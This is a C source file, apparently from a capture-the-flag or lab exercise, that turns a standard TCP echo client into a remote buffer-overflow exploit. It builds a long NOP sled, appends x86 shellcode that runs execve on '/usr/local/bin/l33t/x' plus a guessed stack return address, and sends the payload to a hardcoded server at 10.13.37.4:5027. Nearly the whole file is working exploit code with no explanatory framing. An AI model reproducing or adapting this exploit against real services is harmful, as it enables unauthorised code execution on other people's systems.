#include <sys/types.h>
#include <sys/socket.h>

#include <sys/errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <stdarg.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifndef INADDR_NONE
#define INADDR_NONE     0xffffffff
#endif  /* INADDR_NONE */

extern int	errno;

int	TCPecho(const char *host, const char *portnum);
int	errexit(const char *format, ...);
int	connectsock(const char *host, const char *portnum);


/*------------------------------------------------------------------------
 * main - TCP client for ECHO service
 *------------------------------------------------------------------------
 */
int
main(int argc, char *argv[])
{
	char	*host = "10.13.37.4";	/* host to use if none supplied	*/
	char	*portnum = "5027";	/* default server port number	*/

	TCPecho(host, portnum);
	exit(0);
}

/*-----------------------------------------------------------------------
 * TCPecho - send input to ECHO service on specified host and print reply
 *------------------------------------------------------------------------
 */
int
TCPecho(const char *host, const char *portnum)
{
	char sc[] =
	        "\xeb\x16\x5b\x31\xc0\x88\x43\x13\x89"
		 "\x5b\x14\x89\x43\x18\xb0\x0b\x8d\x4b"
		"\x14\x8d\x53\x18\xcd\x80\xe8\xe5\xff\xff\xff"
		"/usr/local/bin/l33t/xAAAABBBB\x03"
		"AAAABBBB\x64\xf5\xfe\xbf";

	printf("Length of sc |%lu|\n", strlen(sc));

	int i;
	char *send_string = malloc(sizeof(char)*65553);
	int buf_size = 65553;

	for(i = 0; i < 65478; i++) {
	strcat(send_string, "\x90");
	}
	strcat(send_string, sc);
	strcat(send_string, "\n");
	printf("Size of string is |%lu|\n", strlen(send_string));

	char	buf[buf_size];		/* buffer for one line of text	*/
	int	s, n;			/* socket descriptor, read count*/

	s = connectsock(host, portnum);

	memset(buf, '\0', sizeof(buf));
	int wrote = 0;

	while (1) {

		memset(buf, '\0', sizeof(buf));
		n = read(s, buf, sizeof(buf));
			if (n < 0)
				errexit("socket read failed: %s\n",
					strerror(errno));

		fputs(buf, stdout);


		memset(buf, '\0', sizeof(buf));
		//fgets(buf, sizeof(buf), stdin);
		//n = write(s, buf, strlen(buf));
		if(wrote == 0) {
		n = write(s, send_string, strlen(send_string));
		wrote = 1;
		printf("Wrote |%d| bytes\n", n);
			if(n < 0)
				errexit("socket write failed: %s\n", strerror(errno));
		}
	}
}

/*------------------------------------------------------------------------
 * errexit - print an error message and exit
 *------------------------------------------------------------------------
 */
int
errexit(const char *format, ...)
{
        va_list args;

        va_start(args, format);
        vfprintf(stderr, format, args);
        va_end(args);
        exit(1);
}

/*------------------------------------------------------------------------
 * connectsock - allocate & connect a socket using TCP
 *------------------------------------------------------------------------
 */
int
connectsock(const char *host, const char *portnum)
/*
 * Arguments:
 *      host      - name of host to which connection is desired
 *      portnum   - server port number
 */
{
        struct hostent  *phe;   /* pointer to host information entry    */
        struct sockaddr_in sin; /* an Internet endpoint address         */
        int     s;              /* socket descriptor                    */


        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;

    /* Map port number (char string) to port number (int)*/
        if ((sin.sin_port=htons((unsigned short)atoi(portnum))) == 0)
                errexit("can't get \"%s\" port number\n", portnum);

    /* Map host name to IP address, allowing for dotted decimal */
        if ( phe = gethostbyname(host) )
                memcpy(&sin.sin_addr, phe->h_addr, phe->h_length);
        else if ( (sin.sin_addr.s_addr = inet_addr(host)) == INADDR_NONE )
                errexit("can't get \"%s\" host entry\n", host);

    /* Allocate a socket */
        s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s < 0)
                errexit("can't create socket: %s\n", strerror(errno));

    /* Connect the socket */
        if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0)
                errexit("can't connect to %s.%s: %s\n", host, portnum,
                        strerror(errno));
        return s;
}
